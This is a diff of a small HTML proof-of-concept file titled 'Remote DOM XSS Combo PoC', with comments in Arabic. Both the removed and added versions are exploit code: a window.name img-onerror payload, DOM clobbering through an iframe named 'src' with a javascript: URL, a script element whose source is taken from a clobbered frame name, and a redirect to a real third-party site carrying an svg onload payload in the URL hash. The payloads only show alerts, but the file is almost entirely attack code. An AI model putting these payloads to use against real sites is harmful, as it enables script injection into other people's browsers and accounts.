@@ -1,26 +1,9 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>Remote DOM XSS Combo PoC</title>
-</head>
-<body>
-  <h2>🧪 Launching DOM-Based Combo Exploit</h2>
+<iframe name="src" src="javascript:alert('🔥 XSS Exploited!')" id="evil"></iframe>
 
-  <script>
-    // إعداد window.name ببيانات ضارة
-    window.name = `<img src=x onerror=alert('🔥 Remote DOM XSS Triggered')>`;
-
-    // إنشاء iframe لإجراء DOM clobbering
-    let iframe = document.createElement("iframe");
-    iframe.setAttribute("name", "src");  // clobber the 'src' attribute
-    iframe.setAttribute("id", "exploit_frame");
-    iframe.setAttribute("src", "javascript:alert('🧠 DOM Clobber XSS')");
-    iframe.style.display = "none";
-    document.body.appendChild(iframe);
-
-    // تحويل المستخدم إلى صفحة vulnerable
-    // location.hash محقون
-    location.href = "https://thebrowser.company/values/#<svg/onload=alert('👁️ Hash XSS')>";
-  </script>
-</body>
-</html>
+<script>
+setTimeout(() => {
+  const script = document.createElement("script");
+  script.src = window.frames["evil"].name; // هذه هي النقطة التي نستهدف فيها clobbering
+  document.body.appendChild(script);
+}, 500);
+</script>
